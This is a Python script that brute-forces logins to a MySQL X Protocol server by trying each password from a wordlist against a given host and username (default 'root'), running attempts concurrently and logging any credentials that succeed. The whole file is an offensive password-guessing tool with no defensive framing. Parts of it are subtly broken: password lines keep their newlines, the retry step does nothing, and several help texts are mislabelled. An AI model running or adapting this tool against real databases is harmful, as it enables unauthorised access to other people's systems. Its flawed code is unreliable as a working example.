import argparse
import mysqlx
import trio
import sys

from datetime import datetime
from loguru import logger

parser = argparse.ArgumentParser()
parser.add_argument('-w', '--wordlist', help='The wordlist to use for password bruting', type=str)
parser.add_argument('--host', help='The host that the mysqlx server is being hosted on', type=str)
parser.add_argument('-u', '--username', help='The host that the mysqlx server is being hosted on', type=str,
        default='root')
parser.add_argument('--password', help='The host that the mysqlx server is being hosted on', type=str)
parser.add_argument('-p', '--port', help='The port of the mysqlx server to connect to', type=int, 
        action='store', default=33060)

parser.add_argument('-t', '--tasks', type=int, action='store', default=20)

args = parser.parse_args()

async def login(host, port, username, password):
    try:
        session = await trio.to_thread.run_sync(mysqlx.get_session, {
            'host': host,
            'port': port,
            'user': username, 
            'password': password
        }, limiter=trio.CapacityLimiter(args.tasks))

        logger.warning(f'Successfully logged in with credentials {username}:{password}!')
    except Exception as e:
        if 'Access denied' in str(e):
            logger.info(f'Invalid login: {username}:{password}')
        else:
            raise e

def multi_error_contains_mysqlx_error(es: trio.MultiError):
    for e in es.exceptions:
        if isinstance(e, mysqlx.errors.InterfaceError):
            return True

    return False

async def bruteforce_login(host, port, username, wordlist):
    logger.info(f'Brute forcing {username}@{host}:{port} with wordlist {wordlist} using {args.tasks} concurrent tasks')

    start_time = datetime.now()
    with open(wordlist, 'r') as f:
        passwords = []
        for password in f:
            passwords.append(password)
            
        for i in range(0, len(passwords), args.tasks):
            try:
                async with trio.open_nursery() as n:
                    for password in passwords[i:i + args.tasks]:
                        n.start_soon(login, host, port, username, password)

            except (mysqlx.errors.InterfaceError, trio.MultiError) as es:
                if not multi_error_contains_mysqlx_error(es):
                    raise es

                logger.warning(es)
                
                if args.tasks > 2:
                    i -= args.tasks
                    args.tasks -= 2
                    logger.warning(f'Decreasing level of concurrency to {args.tasks}')
                
                logger.info('Retrying in 1 second')
                await trio.sleep(1)

    timedelta = datetime.now() - start_time
    logger.info(f'Execution time: {timedelta}')

trio.run(bruteforce_login, args.host, args.port, args.username, args.wordlist)
